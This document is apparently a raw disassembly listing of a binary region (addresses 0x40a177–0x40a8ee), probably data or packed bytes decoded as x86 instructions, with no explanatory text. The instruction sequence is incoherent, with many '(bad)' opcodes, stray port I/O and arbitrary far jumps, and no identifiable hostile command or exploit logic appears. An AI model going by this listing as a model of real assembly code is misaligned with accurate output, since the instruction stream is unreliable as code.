  40a177:	test   eax,0x1c11cf69
  40a17c:	cdq    
  40a17d:	push   es
  40a17e:	repz inc edi
  40a180:	push   ebx
  40a181:	les    ebp,FWORD PTR [ecx-0x196ecdc8]
  40a187:	pop    ebx
  40a188:	pop    es
  40a189:	add    al,0xe0
  40a18b:	cmove  edi,DWORD PTR fs:[ecx+0xdffc15]
  40a193:	inc    esi
  40a194:	(bad)  
  40a195:	in     eax,dx
  40a196:	ret    0x711a
  40a199:	pop    ss
  40a19a:	push   ds
  40a19b:	ret    
  40a19c:	enter  0x9edd,0xb6
  40a1a0:	test   cl,0x93
  40a1a3:	in     eax,dx
  40a1a4:	jmp    0xc2a4:0x273602cd
  40a1ab:	xor    BYTE PTR [ebp-0xe2b7a08],bl
  40a1b1:	mov    es,WORD PTR [edi+edx*4+0xc]
  40a1b5:	repz rcl al,1
  40a1b8:	push   ss
  40a1b9:	int    0xbb
  40a1bb:	and    eax,0x14984e0a
  40a1c0:	or     dh,0x48
  40a1c3:	cli    
  40a1c4:	adc    eax,0x3cb26ed3
  40a1c9:	sub    al,0xdf
  40a1cb:	jns    0x40a218
  40a1cd:	mov    ecx,0xc0aba75c
  40a1d2:	mov    bh,BYTE PTR [ecx]
  40a1d4:	inc    esi
  40a1d5:	push   cs
  40a1d6:	dec    ecx
  40a1d7:	sbb    al,BYTE PTR [ebx]
  40a1d9:	popa   
  40a1da:	test   edi,0x908a29f9
  40a1e0:	dec    ecx
  40a1e1:	and    dh,BYTE PTR [ebp+0x55e869b4]
  40a1e7:	cli    
  40a1e8:	mov    eax,ds:0x590290e2
  40a1ed:	cmp    DWORD PTR [edx-0x75c30bda],ebx
  40a1f3:	lods   al,BYTE PTR ds:[esi]
  40a1f4:	fistp  QWORD PTR [esi]
  40a1f6:	in     al,dx
  40a1f7:	add    eax,0xe0004777
  40a1fc:	sbb    BYTE PTR [ebx],0x92
  40a1ff:	sar    DWORD PTR [ecx+0x25602fc6],cl
  40a205:	ja     0x40a1cd
  40a207:	dec    edx
  40a208:	jp     0x40a1d9
  40a20a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a20b:	and    eax,DWORD PTR ds:0x81ebe760
  40a211:	aaa    
  40a212:	ds popf 
  40a214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a215:	and    al,0xb8
  40a217:	mov    ecx,0x2fc69dfe
  40a21c:	iret   
  40a21d:	(bad)  
  40a21e:	cmp    WORD PTR cs:[ebx],cx
  40a222:	xor    esp,DWORD PTR [esi]
  40a224:	sbb    eax,0xbe9fb652
  40a229:	lahf   
  40a22a:	les    edx,FWORD PTR [edi]
  40a22c:	inc    edi
  40a22d:	mov    ds:0xa8407635,al
  40a232:	repz or DWORD PTR [edx+0x5],0xe
  40a237:	fwait
  40a238:	adc    ebp,edx
  40a23a:	mov    ss:0xa625f568,al
  40a240:	pop    ds
  40a241:	iret   
  40a242:	cmp    eax,DWORD PTR [edi-0x5ac7b626]
  40a248:	mov    bl,0x6c
  40a24a:	mov    ecx,0xe69c1c8e
  40a24f:	test   eax,0x35a1af8d
  40a254:	jmp    0x784ff7fa
  40a259:	mov    al,0xff
  40a25b:	xlat   BYTE PTR ds:[ebx]
  40a25c:	fisubr WORD PTR [esi-0x61]
  40a25f:	add    esp,DWORD PTR [ecx+0x5a]
  40a262:	xor    eax,0x774fb7e4
  40a267:	xchg   ebp,eax
  40a268:	push   edi
  40a269:	sbb    eax,0x2d04c3fd
  40a26e:	ins    DWORD PTR es:[edi],dx
  40a26f:	inc    ecx
  40a270:	add    edx,DWORD PTR [edi+0x77]
  40a273:	xchg   esi,eax
  40a274:	mov    eax,ds:0xce266ca5
  40a279:	push   0x2046e950
  40a27e:	or     eax,0xe604f028
  40a283:	push   0xd8d47696
  40a288:	jl     0x40a22a
  40a28a:	jle    0x40a23c
  40a28c:	imul   DWORD PTR [esp+edx*8]
  40a28f:	lock sub dh,BYTE PTR [esi-0x29]
  40a293:	push   ds
  40a294:	jne    0x40a24f
  40a296:	cmp    DWORD PTR ds:0x1fcc1768,esi
  40a29c:	mov    ecx,ss
  40a29e:	mov    ebp,0x235b0584
  40a2a3:	mov    dl,0x29
  40a2a5:	aad    0x8
  40a2a7:	dec    esi
  40a2a8:	mov    ds:0xa1ad324b,al
  40a2ad:	ficom  WORD PTR [esi]
  40a2af:	inc    esi
  40a2b0:	mov    edi,0x15d35e21
  40a2b5:	je     0x40a266
  40a2b7:	mov    ebx,0x363606e5
  40a2bc:	or     DWORD PTR [eax-0x12],eax
  40a2bf:	test   bh,bh
  40a2c1:	popf   
  40a2c2:	outs   dx,BYTE PTR ds:[esi]
  40a2c4:	retf   0x8b76
  40a2c7:	mov    eax,0x995d0d51
  40a2cc:	inc    ebp
  40a2cd:	push   cs
  40a2ce:	lods   eax,DWORD PTR ds:[esi]
  40a2cf:	rcl    ebp,1
  40a2d1:	add    al,0xed
  40a2d3:	adc    al,0x2d
  40a2d5:	cmp    esi,ebp
  40a2d7:	push   eax
  40a2d8:	pop    ecx
  40a2d9:	adc    al,0xda
  40a2db:	scas   al,BYTE PTR es:[edi]
  40a2dc:	adc    ah,BYTE PTR [ebx+0x15]
  40a2df:	mov    ebp,DWORD PTR [ecx]
  40a2e1:	inc    esp
  40a2e2:	push   edi
  40a2e3:	inc    esp
  40a2e4:	mov    cl,0xe9
  40a2e6:	pop    esi
  40a2e7:	repnz sti 
  40a2e9:	add    BYTE PTR [ebx-0x66],bl
  40a2ec:	push   esp
  40a2ed:	add    eax,0x5b72d8b3
  40a2f2:	pop    esi
  40a2f3:	push   ecx
  40a2f4:	inc    edx
  40a2f5:	xchg   esi,eax
  40a2f6:	ja     0x40a349
  40a2f8:	aaa    
  40a2f9:	xchg   ecx,edx
  40a2fb:	or     dl,dh
  40a2fd:	xchg   DWORD PTR [edx-0x28],esi
  40a300:	ins    DWORD PTR es:[edi],dx
  40a301:	iret   
  40a302:	sub    bh,bl
  40a304:	test   DWORD PTR [ebx+0x6002d7bd],edi
  40a30a:	aam    0xcd
  40a30c:	mov    bh,0x9b
  40a30e:	retf   
  40a30f:	and    al,0x27
  40a311:	xor    al,0xd7
  40a313:	pop    edx
  40a314:	cld    
  40a315:	mov    al,0x72
  40a317:	sub    cl,bh
  40a319:	xor    al,0x48
  40a31b:	fs sub al,0x2a
  40a31e:	les    edx,FWORD PTR [ecx]
  40a320:	push   cs
  40a321:	inc    ebx
  40a322:	mov    ds:0x87af047e,eax
  40a327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a328:	push   esp
  40a329:	jns    0x40a2d1
  40a32b:	sub    bl,bh
  40a32d:	repnz fwait
  40a32f:	out    dx,al
  40a330:	inc    edi
  40a331:	mov    eax,ds:0x8ddd4e27
  40a336:	jg     0x40a325
  40a338:	(bad)  [edi+eiz*8-0x32ba502c]
  40a33f:	add    BYTE PTR [ebx],cl
  40a341:	aaa    
  40a342:	sub    eax,0xdea47640
  40a347:	push   eax
  40a348:	xchg   ebx,eax
  40a349:	je     0x40a2ed
  40a34b:	arpl   WORD PTR [edx],dx
  40a34d:	loope  0x40a31a
  40a34f:	aad    0xa1
  40a351:	xchg   ecx,eax
  40a352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a353:	mov    eax,0x51a8425
  40a358:	sub    eax,0xa15414f6
  40a35d:	imul   ebx,DWORD PTR [ebp+0x10daeaf6],0x47
  40a364:	int3   
  40a365:	fstp   DWORD PTR [ebx]
  40a367:	push   es
  40a368:	adc    eax,eax
  40a36a:	fisub  WORD PTR [eax-0x2f34c2e]
  40a370:	inc    eax
  40a371:	and    dh,bl
  40a373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a374:	mov    ebx,0xbdf71e48
  40a379:	pop    edx
  40a37b:	call   0x950a890d
  40a380:	jmp    0x259c:0xdf6bf8ee
  40a387:	scas   eax,DWORD PTR es:[edi]
  40a388:	mov    ds:0x6044abf4,al
  40a38d:	(bad)  
  40a38e:	push   0x2179daaa
  40a393:	mov    ebx,0x5d49062c
  40a398:	iret   
  40a399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a39a:	pop    esp
  40a39b:	aas    
  40a39c:	(bad)  
  40a39d:	xlat   BYTE PTR ds:[ebx]
  40a39e:	or     BYTE PTR [esi+0x12],cl
  40a3a1:	and    dl,BYTE PTR [ebx]
  40a3a3:	out    0xf,al
  40a3a5:	mov    DWORD PTR [ebp+0x4deb5575],eax
  40a3ab:	pusha  
  40a3ac:	scas   eax,DWORD PTR es:[edi]
  40a3ad:	bound  esi,QWORD PTR [ebx]
  40a3af:	inc    esp
  40a3b0:	cmc    
  40a3b1:	mov    ch,0x49
  40a3b3:	test   eax,0xf9f480b
  40a3b8:	lahf   
  40a3b9:	mov    edx,0x5ea910e8
  40a3be:	jno    0x40a3f7
  40a3c0:	int    0x92
  40a3c2:	add    ah,BYTE PTR [ebx+0x1e]
  40a3c5:	enter  0x5e18,0x96
  40a3c9:	dec    ebp
  40a3ca:	(bad)  
  40a3cc:	stos   BYTE PTR es:[edi],al
  40a3cd:	(bad)  
  40a3ce:	sbb    DWORD PTR [eax],ecx
  40a3d0:	xchg   BYTE PTR [edi-0x219b216c],dl
  40a3d6:	sub    al,0x50
  40a3d8:	fld    st(0)
  40a3da:	dec    esi
  40a3db:	or     dl,ch
  40a3dd:	dec    edi
  40a3de:	fldpi  
  40a3e0:	out    0xce,eax
  40a3e2:	add    eax,esi
  40a3e4:	imul   edi,DWORD PTR ds:0xcddf4cc6,0xa0e9ab59
  40a3ee:	loopne 0x40a37a
  40a3f0:	push   ss
  40a3f1:	icebp  
  40a3f2:	push   0x65ad0278
  40a3f7:	imul   ebx,DWORD PTR [edx],0x49
  40a3fa:	xor    BYTE PTR [edi-0x483bc40b],ah
  40a400:	call   0xff364b1f
  40a405:	ror    DWORD PTR [ebp-0x56],1
  40a408:	aad    0x9a
  40a40a:	ins    BYTE PTR es:[edi],dx
  40a40b:	mov    ah,0x4f
  40a40d:	cld    
  40a40e:	mov    WORD PTR [edx],gs
  40a410:	add    eax,0x184a3fd0
  40a415:	jno    0x40a489
  40a417:	sbb    al,dh
  40a419:	stos   BYTE PTR es:[edi],al
  40a41a:	xor    BYTE PTR [edx-0x752867c4],dl
  40a420:	adc    eax,0xfc8ae6be
  40a425:	sub    al,0x60
  40a427:	jl     0x40a44c
  40a429:	add    eax,0xd154f203
  40a42e:	push   ebp
  40a42f:	mov    ebp,DWORD PTR [edx]
  40a431:	fimul  WORD PTR [esi]
  40a433:	into   
  40a434:	sbb    DWORD PTR [ebx+edx*8+0x36],esi
  40a438:	test   al,0x8f
  40a43a:	int3   
  40a43b:	dec    ebp
  40a43c:	xor    eax,0x153d69e3
  40a441:	rcl    DWORD PTR [ebp+0x63],1
  40a444:	mov    DWORD PTR [ebp+0x346a4c49],eax
  40a44a:	cs push cs
  40a44c:	mov    ds:0xe15f94b6,eax
  40a451:	imul   ecx,DWORD PTR [edi-0x1],0xffffffda
  40a455:	das    
  40a456:	jge    0x40a494
  40a458:	xor    eax,0x526cbf22
  40a45d:	sahf   
  40a45e:	sub    BYTE PTR [edx-0x15],ch
  40a461:	dec    ebp
  40a462:	test   DWORD PTR [edx-0x73],edi
  40a465:	mov    ebx,0x4ee02214
  40a46a:	pop    es
  40a46b:	pop    edi
  40a46c:	push   ds
  40a46d:	jne    0x40a40c
  40a46f:	xchg   ecx,eax
  40a470:	pop    edi
  40a471:	lods   al,BYTE PTR ds:[esi]
  40a472:	and    ah,BYTE PTR [eax]
  40a474:	cmp    DWORD PTR [eax],edi
  40a476:	cmp    al,0x76
  40a478:	cli    
  40a479:	jb     0x40a4ac
  40a47b:	daa    
  40a47c:	mov    BYTE PTR [ebx+0x473c66fc],ah
  40a482:	jmp    0xac8b1df
  40a487:	out    0xcb,eax
  40a489:	jns    0x40a48f
  40a48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48c:	push   esp
  40a48d:	rol    BYTE PTR [edx],cl
  40a48f:	inc    edx
  40a490:	out    0xef,al
  40a492:	mov    ch,0x65
  40a494:	scas   al,BYTE PTR es:[edi]
  40a495:	mov    esp,0xba5b42ad
  40a49a:	aaa    
  40a49b:	mov    cl,0xf3
  40a49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49e:	cs int3 
  40a4a0:	stc    
  40a4a1:	jge    0x40a4af
  40a4a3:	popf   
  40a4a4:	mov    bh,0xa2
  40a4a6:	mov    edi,0x71d8cf4a
  40a4ab:	ror    DWORD PTR [ebp-0x7d],0x77
  40a4af:	dec    esi
  40a4b0:	sub    eax,0xd9ed725b
  40a4b5:	xor    BYTE PTR [ebx-0x7a3f817f],bh
  40a4bb:	jbe    0x40a500
  40a4bd:	xchg   edi,eax
  40a4be:	or     DWORD PTR [ecx],eax
  40a4c0:	stos   BYTE PTR es:[edi],al
  40a4c1:	fincstp 
  40a4c3:	mov    al,ds:0x6194e09c
  40a4c8:	xchg   esi,eax
  40a4c9:	(bad)  
  40a4ca:	dec    esi
  40a4cb:	outs   dx,DWORD PTR ds:[esi]
  40a4cc:	adc    ah,BYTE PTR [esi+0x3]
  40a4cf:	in     eax,dx
  40a4d0:	push   0x49
  40a4d2:	cmp    DWORD PTR [ebp-0x3ac10c18],edx
  40a4d8:	mov    dl,0x48
  40a4da:	mov    ah,0x2d
  40a4dc:	jge    0x40a521
  40a4de:	(bad)  
  40a4df:	scas   al,BYTE PTR es:[edi]
  40a4e0:	lea    edx,[ebp+0x5b]
  40a4e3:	mov    al,0x42
  40a4e5:	outs   dx,DWORD PTR ds:[esi]
  40a4e6:	or     ch,BYTE PTR [eax]
  40a4e8:	repz xchg ecx,ebx
  40a4eb:	jmp    0x4c8fb1a3
  40a4f0:	ins    BYTE PTR es:[edi],dx
  40a4f1:	call   0x4357:0x949de714
  40a4f8:	push   es
  40a4f9:	dec    edi
  40a4fa:	fld    DWORD PTR [edx+0x5eea5951]
  40a500:	and    al,0x47
  40a502:	push   esi
  40a503:	ins    BYTE PTR es:[edi],dx
  40a504:	in     al,dx
  40a505:	cmp    DWORD PTR [edi-0x10],esp
  40a508:	jmp    0x7ec9249b
  40a50d:	mov    esi,0x12a4ff8f
  40a512:	jl     0x40a57f
  40a514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a515:	mov    dl,0x4b
  40a517:	xchg   bh,cl
  40a519:	jecxz  0x40a591
  40a51b:	mov    DWORD PTR [edx-0x4],ecx
  40a51e:	push   ecx
  40a51f:	js     0x40a58e
  40a521:	stc    
  40a522:	neg    BYTE PTR [edx-0x3d]
  40a525:	mov    DWORD PTR [eax+0x78],ebp
  40a528:	mov    ebx,0xa97a0519
  40a52d:	(bad)  
  40a52f:	hlt    
  40a530:	push   ss
  40a531:	dec    ebx
  40a532:	mov    cs:0xbef7c9a7,al
  40a538:	sbb    eax,0x79a1745d
  40a53d:	fnstcw WORD PTR ds:0x432fce09
  40a543:	icebp  
  40a544:	retf   
  40a545:	jl     0x40a50e
  40a547:	pushf  
  40a548:	cmp    al,0x74
  40a54a:	dec    eax
  40a54b:	mov    esi,0x4a864013
  40a550:	adc    eax,0xeb90d30a
  40a555:	fild   QWORD PTR [edi-0x7c]
  40a558:	out    dx,al
  40a559:	aas    
  40a55a:	mov    bl,0xfd
  40a55c:	jne    0x40a5d7
  40a55e:	loop   0x40a524
  40a560:	cmp    eax,0xc7e670e7
  40a565:	into   
  40a566:	and    ecx,eax
  40a568:	mov    eax,ds:0xb9d93e42
  40a56d:	cs inc edx
  40a56f:	xchg   ebp,eax
  40a570:	gs add eax,0xe477ee4f
  40a576:	imul   ebx,DWORD PTR [ebx-0x735dae24],0x64b82b95
  40a580:	fdiv   QWORD PTR [ebx]
  40a583:	jne    0x40a565
  40a585:	sti    
  40a586:	jp     0x40a602
  40a588:	mov    bl,0xe7
  40a58a:	xchg   edx,eax
  40a58b:	push   ecx
  40a58c:	inc    edi
  40a58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58e:	call   0x9b5f:0x45c5e19e
  40a595:	push   0xfd602a2d
  40a59a:	and    dh,BYTE PTR [edx+0x1c]
  40a59d:	inc    ebx
  40a59e:	xchg   edx,eax
  40a59f:	stc    
  40a5a0:	and    BYTE PTR [ebx-0x36],bh
  40a5a3:	cwde   
  40a5a4:	rol    DWORD PTR [edx-0x476ce91a],1
  40a5aa:	out    dx,al
  40a5ab:	dec    edx
  40a5ac:	pop    ebp
  40a5ad:	test   BYTE PTR [ebp+0x1013dd4e],bh
  40a5b3:	mov    eax,ds:0xb867a9dc
  40a5b8:	outs   dx,BYTE PTR ds:[esi]
  40a5b9:	mov    edi,0xa8b6dc81
  40a5be:	call   0x8051:0x8c729bf7
  40a5c5:	shl    WORD PTR [eax-0x58],0x9f
  40a5ca:	inc    edx
  40a5cb:	jns    0x40a59c
  40a5cd:	and    al,BYTE PTR [esp+ecx*1]
  40a5d0:	in     al,dx
  40a5d1:	std    
  40a5d2:	xchg   esp,eax
  40a5d3:	cmp    edx,DWORD PTR ds:0xfa991ae7
  40a5d9:	repz dec edx
  40a5db:	cli    
  40a5dc:	mov    esi,0x277f2580
  40a5e1:	fsub   DWORD PTR [ebx-0x2]
  40a5e4:	and    BYTE PTR ds:0x33ed8d19,al
  40a5ea:	test   al,0x4f
  40a5ec:	inc    eax
  40a5ed:	inc    eax
  40a5ee:	out    0xb,eax
  40a5f0:	hlt    
  40a5f1:	pop    ebp
  40a5f2:	xor    edx,DWORD PTR [eax]
  40a5f4:	dec    BYTE PTR [ebx-0x11]
  40a5f7:	mov    ds:0xbaa9b3ea,al
  40a5fc:	pop    ebp
  40a5fd:	dec    edi
  40a5fe:	(bad)  
  40a5ff:	out    0x78,al
  40a601:	lods   al,BYTE PTR ds:[esi]
  40a602:	outs   dx,BYTE PTR ds:[esi]
  40a603:	sub    BYTE PTR [eax],bl
  40a605:	and    eax,0xeb5a511d
  40a60a:	sub    DWORD PTR [edx+0x6da28544],edx
  40a610:	or     BYTE PTR [ecx+0x483852f0],ah
  40a616:	dec    esi
  40a617:	xor    DWORD PTR [eax-0x3a8724c7],eax
  40a61d:	push   es
  40a61e:	xchg   edi,eax
  40a61f:	and    edx,DWORD PTR [edx+0x71d21e9e]
  40a625:	(bad)  
  40a626:	leave  
  40a627:	sub    al,0xeb
  40a629:	sbb    BYTE PTR [ecx+0x53],ah
  40a62c:	push   ecx
  40a62d:	mul    DWORD PTR [ebp-0x2b]
  40a630:	inc    ebp
  40a631:	pop    ds
  40a632:	xchg   ecx,eax
  40a633:	jae    0x40a6ad
  40a635:	ret    0x667b
  40a638:	mov    eax,DWORD PTR [esi+0x57]
  40a63b:	sbb    al,0xeb
  40a63d:	pop    ebp
  40a63e:	push   ebp
  40a63f:	ss cmc 
  40a641:	inc    edx
  40a642:	dec    eax
  40a643:	cwde   
  40a644:	js     0x40a5ed
  40a646:	adc    cl,al
  40a648:	jge    0x40a603
  40a64a:	or     esi,DWORD PTR [edi]
  40a64c:	and    ecx,0xda6eb083
  40a652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a653:	dec    ebp
  40a654:	sub    al,0x85
  40a656:	bound  edi,QWORD PTR [ecx+0x35]
  40a659:	xchg   ebp,eax
  40a65a:	wbinvd 
  40a65c:	cmp    eax,0xb43b5c4a
  40a661:	jae    0x40a683
  40a663:	mov    esi,DWORD PTR [ebx]
  40a665:	(bad)  
  40a666:	fidivr DWORD PTR [edi]
  40a668:	jl     0x40a6b1
  40a66a:	push   edi
  40a66b:	test   eax,0x49bf1384
  40a670:	or     eax,0xe77a026a
  40a675:	pop    ecx
  40a676:	aad    0x67
  40a678:	mov    BYTE PTR [ebx-0x4a99ca24],bl
  40a67e:	pop    ebx
  40a67f:	dec    esi
  40a680:	ret    
  40a681:	jne    0x40a693
  40a683:	std    
  40a684:	rol    BYTE PTR [edi+0x29786700],cl
  40a68a:	loopne 0x40a6a1
  40a68c:	xor    al,0x80
  40a68e:	inc    edi
  40a68f:	push   0x79
  40a691:	ja     0x40a669
  40a693:	xchg   esp,eax
  40a694:	out    dx,eax
  40a695:	nop
  40a696:	sub    esp,DWORD PTR [ecx+eiz*2]
  40a699:	xor    ebx,DWORD PTR [edi]
  40a69b:	addr16 out 0xa7,eax
  40a69e:	and    DWORD PTR [ebx-0x20],edx
  40a6a1:	mov    ds:0xbe6f5ed7,al
  40a6a6:	scas   eax,DWORD PTR es:[edi]
  40a6a7:	xchg   esi,eax
  40a6a8:	mov    BYTE PTR [edx+0x42],0x33
  40a6ac:	mov    al,0xf8
  40a6ae:	arpl   di,ax
  40a6b0:	dec    edx
  40a6b1:	xor    al,BYTE PTR [esi]
  40a6b3:	xchg   ecx,eax
  40a6b4:	sub    DWORD PTR [esi],0xffffff80
  40a6b7:	inc    ecx
  40a6b8:	icebp  
  40a6b9:	xchg   edx,eax
  40a6ba:	into   
  40a6bb:	push   0x75
  40a6bd:	add    bl,BYTE PTR [ebp+0x1b]
  40a6c0:	ficomp DWORD PTR [ecx+0x4d]
  40a6c3:	scas   al,BYTE PTR es:[edi]
  40a6c4:	stos   DWORD PTR es:[edi],eax
  40a6c5:	xor    eax,0xeab7ecbc
  40a6ca:	xor    ch,BYTE PTR cs:[ebx]
  40a6cd:	cld    
  40a6ce:	outs   dx,BYTE PTR ds:[esi]
  40a6cf:	jae    0x40a685
  40a6d1:	jecxz  0x40a69f
  40a6d3:	dec    ecx
  40a6d4:	sbb    BYTE PTR [edi+0x60654c1],ch
  40a6da:	adc    eax,0x8993f01f
  40a6df:	ret    0x13d7
  40a6e2:	fistp  QWORD PTR [edi]
  40a6e4:	cwde   
  40a6e5:	jae    0x40a679
  40a6e7:	ins    BYTE PTR es:[edi],dx
  40a6e8:	retf   
  40a6e9:	ins    DWORD PTR es:[edi],dx
  40a6ea:	xor    esp,DWORD PTR [esi]
  40a6ec:	or     ebx,DWORD PTR [edx+0x339053a1]
  40a6f2:	cmc    
  40a6f3:	add    ch,bh
  40a6f5:	jb     0x40a6d4
  40a6f7:	inc    ebp
  40a6f8:	add    BYTE PTR [ebp+0x57],dl
  40a6fb:	pop    esi
  40a6fc:	mov    bh,cl
  40a6fe:	cwde   
  40a6ff:	in     eax,dx
  40a700:	add    DWORD PTR [ebp-0x37],edx
  40a703:	in     eax,0xd5
  40a705:	mov    dh,0xff
  40a707:	popf   
  40a708:	cmovo  esi,DWORD PTR [edx+0x27]
  40a70c:	ja     0x40a77b
  40a70e:	repz or BYTE PTR [esi],dh
  40a711:	nop
  40a712:	rcl    BYTE PTR [eax],cl
  40a714:	jmp    0x40a795
  40a716:	bound  edi,QWORD PTR [ebp-0x37cf09ea]
  40a71c:	cs xchg ebx,eax
  40a71e:	ins    BYTE PTR es:[edi],dx
  40a71f:	pop    esp
  40a720:	push   ebx
  40a721:	push   ebp
  40a722:	inc    edx
  40a723:	xor    ecx,DWORD PTR [ebx-0x8]
  40a726:	stc    
  40a727:	loopne 0x40a702
  40a729:	ds div eax
  40a72c:	arpl   WORD PTR [esi+0x3ac44357],bx
  40a732:	sbb    BYTE PTR [esi-0x72],bh
  40a735:	lods   al,BYTE PTR ds:[esi]
  40a736:	jl     0x40a6d9
  40a738:	not    DWORD PTR [ebx+0x1a]
  40a73b:	xor    eax,0x7707e03b
  40a740:	cwde   
  40a741:	dec    ebp
  40a742:	mov    cl,0x5a
  40a744:	imul   edi,DWORD PTR [edx-0x14ed67da],0x3a
  40a74b:	mov    edi,0xc9aee0c5
  40a750:	nop
  40a751:	mov    ds:0x9c59c918,al
  40a756:	jmp    0x40a7d1
  40a758:	dec    edx
  40a759:	or     DWORD PTR [esi+0x74be0c5],esi
  40a75f:	sub    BYTE PTR [edx],bh
  40a761:	mov    eax,DWORD PTR [eax+0x43f6d030]
  40a767:	loopne 0x40a799
  40a769:	dec    ebx
  40a76a:	cwde   
  40a76b:	dec    eax
  40a76c:	lock fdivp st(6),st
  40a76f:	stos   DWORD PTR es:[edi],eax
  40a770:	or     esp,eax
  40a772:	inc    eax
  40a773:	cmp    ebp,DWORD PTR [ebp+0x3c]
  40a776:	pusha  
  40a777:	pop    ds
  40a778:	xor    BYTE PTR [esi-0x1e06fcc],bl
  40a77e:	push   ebp
  40a77f:	cs cmp al,0xac
  40a782:	jmp    0x40a774
  40a784:	les    eax,FWORD PTR cs:[edx]
  40a787:	pop    ecx
  40a788:	pop    ebp
  40a789:	push   cs
  40a78a:	push   eax
  40a78b:	mov    eax,0xb1d9e883
  40a790:	sbb    eax,0x9657a41f
  40a795:	adc    BYTE PTR [ecx-0x5c],0xbe
  40a799:	fldcw  WORD PTR [ebp+0x21238a7f]
  40a79f:	lds    esi,FWORD PTR [ecx-0x24]
  40a7a2:	(bad)  
  40a7a3:	pushf  
  40a7a4:	addr16 dec edx
  40a7a6:	add    BYTE PTR [eax-0x67d79dc5],0x5b
  40a7ad:	cmp    BYTE PTR [ebp+0x6f],0x60
  40a7b1:	xchg   ecx,eax
  40a7b2:	sbb    eax,0xa9717668
  40a7b7:	es pushf 
  40a7b9:	stos   BYTE PTR es:[edi],al
  40a7ba:	(bad)
  40a7bd:	popa   
  40a7be:	sbb    eax,0x9ff626cc
  40a7c3:	fild   WORD PTR [ebp+0x8]
  40a7c6:	jp     0x40a7e7
  40a7c8:	cmp    al,0xa6
  40a7ca:	push   ss
  40a7cb:	cmp    BYTE PTR [eax+0x55023cfc],ch
  40a7d1:	aad    0x8f
  40a7d3:	jge    0x40a77e
  40a7d5:	push   edx
  40a7d6:	aam    0x30
  40a7d8:	mov    BYTE PTR [ebp+ebp*2+0x50],ch
  40a7dc:	add    eax,0x74da9b40
  40a7e1:	xor    eax,0xbe899ad7
  40a7e6:	sub    BYTE PTR [edi-0x307699c7],dl
  40a7ec:	sbb    DWORD PTR [ebp+0x190d011a],ecx
  40a7f2:	mov    al,0x25
  40a7f4:	retf   
  40a7f5:	ror    BYTE PTR [ebp+0x4c],0xae
  40a7f9:	jle    0x40a813
  40a7fb:	fst    DWORD PTR [ebp-0xa]
  40a7fe:	and    eax,0x8de81025
  40a803:	pop    eax
  40a804:	sti    
  40a805:	push   ecx
  40a806:	jecxz  0x40a877
  40a808:	pop    esp
  40a809:	jno    0x40a7b9
  40a80b:	shl    DWORD PTR [esi],cl
  40a80d:	(bad)  
  40a80e:	ror    BYTE PTR [edi],1
  40a810:	xchg   ah,bh
  40a812:	aas    
  40a813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a814:	jno    0x40a7a6
  40a816:	adc    DWORD PTR cs:[esi+0x67bf620],ecx
  40a81d:	iret   
  40a81e:	(bad)  
  40a81f:	aaa    
  40a820:	test   BYTE PTR ds:0xe5183d17,ch
  40a826:	add    DWORD PTR [edx],ecx
  40a828:	mov    ecx,0x3cdd2a5
  40a82d:	cli    
  40a82e:	push   esi
  40a82f:	jne    0x40a876
  40a831:	call   0xc9ccf897
  40a836:	mov    eax,0x213412df
  40a83b:	jae    0x40a809
  40a83d:	mov    ebx,0xa9ffdd9b
  40a842:	mov    al,0x17
  40a844:	dec    edi
  40a845:	fldlg2 
  40a847:	pusha  
  40a848:	pop    edi
  40a849:	mov    ds:0xa3bc241d,al
  40a84e:	push   cs
  40a84f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a850:	out    0x65,al
  40a852:	jne    0x40a82f
  40a854:	retf   0x3f14
  40a857:	jge    0x40a81d
  40a859:	and    esi,edi
  40a85b:	mov    ecx,0x33418cc4
  40a860:	pop    ss
  40a861:	xor    eax,eax
  40a863:	(bad)  
  40a864:	enter  0x53b1,0xb0
  40a868:	adc    DWORD PTR ds:0x79904449,eax
  40a86e:	and    cl,BYTE PTR [ebx]
  40a870:	int    0x65
  40a872:	and    DWORD PTR [eax-0x3f],esp
  40a875:	pusha  
  40a876:	mov    al,0xc9
  40a878:	pop    ds
  40a879:	imul   edx,DWORD PTR [ecx],0x61e61bab
  40a87f:	push   es
  40a880:	ret    0xbf16
  40a883:	sbb    ch,BYTE PTR [edi+0x566f4b8f]
  40a889:	xlat   BYTE PTR ds:[ebx]
  40a88a:	retf   
  40a88b:	adc    DWORD PTR ds:0x67caf0fa,esi
  40a891:	sub    eax,0x2d3e20c8
  40a896:	sti    
  40a897:	mov    esi,0x231c42df
  40a89c:	cmp    bh,BYTE PTR ds:0xfc0cde61
  40a8a2:	pop    edx
  40a8a3:	retf   
  40a8a4:	add    edx,esi
  40a8a6:	mov    edx,0xb0411d4d
  40a8ab:	xor    dh,BYTE PTR [ecx+ecx*1-0x386b6371]
  40a8b2:	push   es
  40a8b3:	fwait
  40a8b4:	push   eax
  40a8b5:	or     esp,ebp
  40a8b7:	add    al,0x44
  40a8b9:	mov    ah,0x9a
  40a8bb:	xor    BYTE PTR [ecx+0x47],0xb2
  40a8bf:	nop
  40a8c0:	int    0x71
  40a8c2:	push   edx
  40a8c3:	and    ah,BYTE PTR [edi]
  40a8c5:	fdivr  QWORD PTR [edi-0x26bf7a5b]
  40a8cb:	bswap  esp
  40a8cd:	jne    0x40a921
  40a8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8d0:	mov    ebx,0xac83b391
  40a8d5:	mov    esp,0xfbf6c2b3
  40a8da:	pop    ecx
  40a8db:	add    DWORD PTR [edi-0x6295cfa8],ecx
  40a8e1:	cmp    DWORD PTR [ebx+0x123962a5],0x3c
  40a8e8:	xor    DWORD PTR [ebp-0x7b],ebx
  40a8eb:	scas   eax,DWORD PTR es:[edi]
  40a8ec:	inc    edi
  40a8ed:	pop    es
  40a8ee:	push   edx
